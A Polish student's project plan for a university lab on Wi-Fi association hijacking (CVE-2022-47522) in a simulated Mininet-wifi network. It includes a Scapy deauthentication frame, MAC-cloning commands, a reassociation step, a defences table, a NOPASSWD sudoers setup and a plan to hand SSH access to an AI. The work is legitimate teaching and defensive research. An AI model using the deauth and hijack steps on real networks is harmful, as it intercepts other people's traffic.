# Plan realizacji — MAC Spoofing + Association Hijacking

**Autor:** Bartek  
**Temat:** Ominięcie izolacji klientów przez podmianę adresu MAC przy asocjacji  
**Środowisko:** Kali Linux (VM) · Mininet-wifi · Scapy · hostapd · Wireshark  
**Termin:** Prezentacja 17.06.2026

---

## Czym jest ten atak (skrót)

Standard 802.11 rozdziela dwie rzeczy, które powinny być ze sobą powiązane:
- **Autentykacja** — odbywa się na podstawie hasła / certyfikatu (kto ty jesteś)
- **Rutowanie pakietów** — odbywa się na podstawie adresu MAC (gdzie wysłać ruch)

AP nie weryfikuje, czy osoba logująca się hasłem `X` ma prawo używać adresu MAC `Y`.  
Atakujący loguje się **swoim** hasłem, ale podaje **MAC ofiary** — AP kieruje ruch ofiary do atakującego.

CVE-2022-47522 · MacStealer · AirSnitch sekcja V.B (Port Stealing)

---

## Etap 0 — Przygotowanie VM (zrób sam, jednorazowo)

### 0.1 Ustawienia maszyny wirtualnej
- RAM: min **4 GB** (zalecane 6 GB)
- CPU: min **2 rdzenie**
- Dysk: min **30 GB**
- Sieć: **Bridged Adapter** (VM dostaje IP w tej samej sieci co laptop)

### 0.2 Włącz SSH na Kali
```bash
sudo systemctl enable ssh --now
sudo apt install -y openssh-server   # jeśli brak
ip a | grep "inet "                  # zapisz IP, np. 192.168.1.105
```

### 0.3 Skonfiguruj użytkownika
```bash
# opcja A: użytkownik kali (domyślny)
# opcja B: dedykowany użytkownik
sudo adduser bbsk
sudo usermod -aG sudo bbsk
echo "bbsk ALL=(ALL) NOPASSWD: ALL" | sudo tee /etc/sudoers.d/bbsk
```

### 0.4 Test SSH z Windowsa
```powershell
ssh bbsk@192.168.1.105
```
Jak działa → podaj mi: **IP + użytkownik + hasło** — przejmuję resztę.

---

## Etap 1 — Instalacja środowiska (zrobi AI po SSH)

### 1.1 Pakiety systemowe
```bash
sudo apt update
sudo apt install -y git python3-pip wireshark tshark tcpdump iw \
     wireless-tools net-tools build-essential
```

### 1.2 Mininet-wifi
```bash
cd ~
git clone https://github.com/intrig-unicamp/mininet-wifi.git
cd mininet-wifi
sudo util/install.sh -Wlnfv
# instalacja trwa ok. 15-30 minut
mn --version   # weryfikacja
```

### 1.3 Scapy
```bash
sudo pip3 install scapy --break-system-packages
python3 -c "import scapy; print('scapy OK')"
```

### 1.4 Moduł mac80211_hwsim
```bash
sudo modprobe mac80211_hwsim
lsmod | grep mac80211_hwsim   # musi coś zwrócić
```

### 1.5 Struktura folderów projektu
```
~/bbsk-projekt/
├── topology.py          # topologia Mininet-wifi
├── attack.py            # skrypt ataku (MAC spoof + deauth + reconnect)
├── baseline_test.sh     # test izolacji przed atakiem
├── captures/            # pliki .pcap z Wiresharka
└── logs/                # logi hostapd i terminali
```

---

## Etap 2 — Baseline (izolacja działa)

**Cel:** udowodnić w PCAP, że izolacja klientów blokuje komunikację sta↔sta.

### 2.1 Topologia

```
  [sta1 (ofiara)]         [sta2 (atakujący)]
       \                       /
        ------[ AP (ap1) ]-----
               |
           [h1 (serwer/host)]
```

Parametry AP:
- SSID: `testnet`
- WPA2-PSK, hasło: `password123`
- `client_isolation=True`

### 2.2 Uruchomienie
```bash
sudo python3 ~/bbsk-projekt/topology.py
```

### 2.3 Test izolacji
```
mininet-wifi> sta1 ping -c 5 sta2   # POWINNO FAILOWAĆ
mininet-wifi> sta1 ping -c 5 h1     # powinno działać (sta → host)
```

### 2.4 Zapis dowodów
```bash
# osobny terminal:
sudo tshark -i ap1-wlan0 -w ~/bbsk-projekt/captures/baseline.pcap
```

---

## Etap 3 — Atak główny

### Krok 1: Odczytaj MAC ofiary
```bash
# w terminalu sta1 albo z interfejsu AP
iw dev sta1-wlan0 info | grep addr
# wynik np.: addr 02:00:00:00:01:00
```

### Krok 2: Odśnieżenie ruchu ofiary (opcjonalne, bardziej realistyczne)
```bash
# w sta1:
wget -q http://10.0.0.1/index.html &   # ofiara "ładuje stronę"
```

### Krok 3: Rozłącz ofiarę
```python
# Scapy — ramka Deauthentication
from scapy.all import *
dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff",   # broadcast
              addr2="<MAC_AP>",
              addr3="<MAC_AP>")
frame = RadioTap() / dot11 / Dot11Deauth(reason=7)
sendp(frame, iface="sta2-wlan0", count=10, inter=0.1)
```

### Krok 4: Zmień MAC atakującego
```bash
# w sta2:
sudo ip link set sta2-wlan0 down
sudo ip link set sta2-wlan0 address 02:00:00:00:01:00   # MAC ofiary
sudo ip link set sta2-wlan0 up
```

### Krok 5: Ponowna asocjacja z MAC ofiary
```bash
# w sta2:
sudo wpa_cli -i sta2-wlan0 reassociate
# albo przez iw:
sudo iw dev sta2-wlan0 connect testnet
```

### Krok 6: Sprawdź przekierowanie
```bash
# z hosta h1:
h1 ping -c 10 <IP_ofiary>   # ruch powinien trafić do sta2, nie sta1!
```

### Krok 7: Zapis PCAP
```bash
sudo tshark -i sta2-wlan0 -w ~/bbsk-projekt/captures/attack.pcap
# filtr w Wiresharku: ip.dst == <IP_ofiary>
```

---

## Etap 4 — Automatyzacja (skrypt attack.py)

Pełen skrypt w Pythonie łączący wszystkie powyższe kroki:
- start topologii Mininet-wifi
- generowanie ruchu przez ofiarę
- podmiana MAC + reconnect ze Scapy
- zapis PCAP
- weryfikacja przekierowania (asercja: sta2 dostała pakiety adresowane do sta1)

Skrypt zostanie napisany przez AI po połączeniu SSH.

---

## Etap 5 — Wariant rozszerzony (Cross-BSSID)

Jeśli starczy czasu — bardziej efektowny wariant dla prezentacji:

```
  [sta1 (ofiara)]          [sta2 (atakujący)]
       \                        /
    [ ap1 — sieć główna ]  [ ap1 — sieć gościnnna ]
           (ten sam fizyczny AP, 2 BSSID)
```

- atakujący jest w **sieci gościnnej** (niższe uprawnienia)
- klonuje MAC ofiary z **sieci głównej**
- ruch ofiary wycieka do gościnnej sieci

---

## Etap 6 — Obrona i mitigacje

Do raportu (opisać + opcjonalnie przetestować):

| Obrona | Mechanizm | Gdzie skonfigurować |
|--------|-----------|---------------------|
| Zablokowanie duplikatu MAC | AP odrzuca asocjację jeśli MAC był niedawno używany | hostapd: `disassoc_low_ack` + logika |
| 802.11w (PMF) | Szyfruje ramki Deauth, blokuje kradzież rozłączenia | hostapd: `ieee80211w=2` |
| Per-Station PSK / Identity PSK | Łączy tożsamość użytkownika z MAC w PMK cache | hostapd Multi-PSK |
| Dynamiczne tabele ARP (DAI) | Sprawdza binding IP↔MAC | hostapd + ebtables |
| RADIUS + 802.1X | Weryfikacja certyfikatami, nie PSK | WPA2/3 Enterprise |

Test obrony:
```bash
# W hostapd.conf dodaj:
# ieee80211w=2
# ap_max_inactivity=30
# następnie powtórz atak → ma failować
```

---

## Etap 7 — Raport (Twoja sekcja)

Struktura sekcji (~4–5 stron):

1. **Opis ataku** — mechanizm, dlaczego izolacja nie pomaga
2. **Środowisko** — topologia, parametry AP
3. **Przebieg eksperymentu** — baseline + atak krok po kroku ze zrzutami
4. **Analiza PCAP** — zrzuty Wiresharka z opisem
5. **Obrona** — co działa, co nie
6. **Wnioski** — powiązanie z literaturą (AirSnitch, MacStealer, CVE-2022-47522)

---

## Etap 8 — Prezentacja (17.06)

Demo live (ok. 5 min z Twojej części):
1. Uruchom topologię — pokaż izolację (`ping` failuje).
2. Uruchom skrypt ataku.
3. Pokaż Wiresharka — ruch ofiary trafia do atakującego.
4. (Opcjonalnie) Włącz PMF — pokaż, że deauth jest blokowane.

---

## Harmonogram do 17.06

| Dzień | Zadanie |
|-------|---------|
| Dziś (10.06) | Konfiguracja VM + SSH → przekazanie dostępu |
| 11.06 | AI: instalacja środowiska + topologia + baseline |
| 12–13.06 | AI: implementacja ataku + skrypt attack.py |
| 14.06 | Testy end-to-end + PCAP + poprawki |
| 15–16.06 | Pisanie sekcji raportu |
| 17.06 | Prezentacja |

---

## Linki

- MacStealer repo: https://github.com/vanhoefm/macstealer
- AirSnitch repo: https://github.com/vanhoefm/airsnitch
- Mininet-wifi: https://github.com/intrig-unicamp/mininet-wifi
- Scapy 802.11 docs: https://scapy.readthedocs.io/en/latest/api/scapy.layers.dot11.html
- USENIX paper (Framing Frames): https://papers.mathyvanhoef.com/usenix2023-wifi.pdf
- CVE-2022-47522: https://www.cvedetails.com/cve/CVE-2022-47522/
